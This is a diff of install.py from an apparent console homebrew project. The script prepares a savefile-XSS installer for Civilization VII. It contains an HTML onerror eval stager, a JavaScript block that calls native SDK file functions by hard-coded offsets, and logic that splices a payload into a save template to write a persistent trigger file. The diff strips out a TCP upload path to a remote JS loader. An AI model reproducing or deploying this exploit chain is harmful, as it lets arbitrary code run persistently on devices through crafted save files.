@@ -2,34 +2,20 @@
 # SPDX-License-Identifier: MIT
 # Copyright (c) 2026 Gezine. See LICENSES/Gezine-MIT.txt.
 # Source: https://github.com/Gezine/CivSwitch/blob/3238a3e3340fd19a9dbd5cde56f3b50f9bc5d97f/installer-creator/install.py
-"""install.py - one-shot CIV7 savefile-XSS installer.
+"""install.py - prepare assets for the one-shot CIV7 savefile-XSS installer.
 
-Builds the installer in a temporary directory, compresses the payload,
-splices it into the bundled save template and writes the persistent
-XSTRIG.Civ7Save trigger (cleaning up any previously installed trigger files
-first). It can prepare assets for the UDP/LDN transfer or send the installer
-through an already-running TCP Remote JS Loader.
+Builds the apply script and Base64 save template for transfer over UDP/LDN.
+The console applies them and writes the persistent XSTRIG.Civ7Save trigger.
 
 The LDN launcher can build offline transfer assets with:
   python install.py --build-ldn-assets <output-dir> [payload.js]
 
-Usage:
-  python install.py <console-ip> [port] [payload.js]
-
-  <console-ip>   required
-  [port]         optional, default 9026
-  [payload.js]   optional, default ../payloads/core.js
-                 (the shipped default is the Remote JS Loader: after
-                 reboot, Load Game brings the loader up on this port)
-
 Needs: node + terser (npm install at the repository root),
-and the Remote JS Loader already running on the console (Pico bootstrap
-or a previously installed trigger).
+and the bundled save template from this directory.
 """
-import base64, io, json, os, shutil, socket, subprocess, sys, tempfile, time
+import base64, io, json, os, shutil, subprocess, sys, tempfile
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-CHUNK = 400000   # b64 chars per loader connection (< 500KB payload limit)
 
 STAGER = ('<img src=x onerror="eval(document.body.textContent'
           ".match(/XSSP:[0-9]+:[0-9a-f]+/g)"
@@ -42,7 +28,7 @@ BLOCK = r"""
 (async function() {
 try {
 
-// ==== savefile-XSS installer (template transferred over LDN or TCP) ====
+// ==== savefile-XSS installer (template transferred over LDN) ====
 const F_CreateFile  = sdk_base + 0xa6700n;
 const F_OpenFile    = sdk_base + 0xa78a0n;
 const F_CloseFile   = sdk_base + 0xa5a70n;
@@ -114,7 +100,7 @@ function sfx_b64dec(s) {
 
 const tplB64 = (window.__tpl || []).join("");
 if (tplB64.length !== TPL_B64_LEN) {
-    await log("E: template upload incomplete - run install.py again");
+    await log("E: template upload incomplete - rerun npm start");
     return;
 }
 window.__tpl = null;
@@ -192,24 +178,6 @@ await log(e.stack);
 """
 
 
-def send(host, port, code, timeout=300):
-    s = socket.create_connection((host, port), timeout=8)
-    s.sendall(code.encode())
-    s.shutdown(socket.SHUT_WR)
-    s.settimeout(timeout)
-    data = b""
-    try:
-        while True:
-            c = s.recv(65536)
-            if not c:
-                break
-            data += c
-    except socket.timeout:
-        pass
-    s.close()
-    return data.decode("utf-8", "replace")
-
-
 def load_template():
     tpl = open(os.path.join(HERE, "save_template.bin"), "rb").read()
     if len(tpl) < 4096 or tpl[:4] != b"CIV7":
@@ -254,48 +222,19 @@ def build_ldn_assets(output_dir, payload_path):
 
 
 def main():
-    if len(sys.argv) > 1 and sys.argv[1] == "--build-ldn-assets":
-        if len(sys.argv) not in (3, 4):
-            print("Usage: install.py --build-ldn-assets <output-dir> [payload.js]", file=sys.stderr)
-            sys.exit(1)
-        payload_path = sys.argv[3] if len(sys.argv) == 4 else os.path.join(HERE, "..", "payloads", "core.js")
-        try:
-            build_ldn_assets(sys.argv[2], payload_path)
-        except Exception as e:
-            print("Could not build LDN installer assets: " + str(e), file=sys.stderr)
-            sys.exit(2)
-        return
-
-    if len(sys.argv) < 2:
+    if len(sys.argv) == 1:
         print(__doc__)
         sys.exit(1)
-    host = sys.argv[1]
-    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9026
-    payload_path = sys.argv[3] if len(sys.argv) > 3 else os.path.join(HERE, "..", "payloads", "core.js")
+    if sys.argv[1] != "--build-ldn-assets" or len(sys.argv) not in (3, 4):
+        print("Usage: install.py --build-ldn-assets <output-dir> [payload.js]", file=sys.stderr)
+        sys.exit(1)
 
-    tmp = tempfile.mkdtemp(prefix="civ7inst_")
+    payload_path = sys.argv[3] if len(sys.argv) == 4 else os.path.join(HERE, "..", "payloads", "core.js")
     try:
-        # 1. template and apply payload
-        tpl_b64 = load_template()
-        apply_js = build_apply_js(payload_path, tpl_b64, tmp)
-
-        # 3. upload template chunks, then apply
-        print(send(host, port, "log('STARTING INSTALLER');window.__tpl=null;'reset'").strip())
-        n = (len(tpl_b64) + CHUNK - 1) // CHUNK
-        t0 = time.time()
-        for i in range(n):
-            part = tpl_b64[i * CHUNK:(i + 1) * CHUNK]
-            out = send(host, port,
-                       "(window.__tpl=window.__tpl||[]).push('%s');"
-                       "'chunk %d/%d'" % (part, i + 1, n))
-            if "Executed" not in out:
-                print("chunk %d/%d FAILED: %s" % (i + 1, n, out.strip()[:200]))
-        print("template: %d chunks, %.0fs" % (n, time.time() - t0))
-        out = send(host, port, apply_js)
-        print(out)
-        sys.exit(0 if "INSTALL DONE" in out else 1)
-    finally:
-        shutil.rmtree(tmp, ignore_errors=True)
+        build_ldn_assets(sys.argv[2], payload_path)
+    except Exception as e:
+        print("Could not build LDN installer assets: " + str(e), file=sys.stderr)
+        sys.exit(2)
 
 
 if __name__ == "__main__":
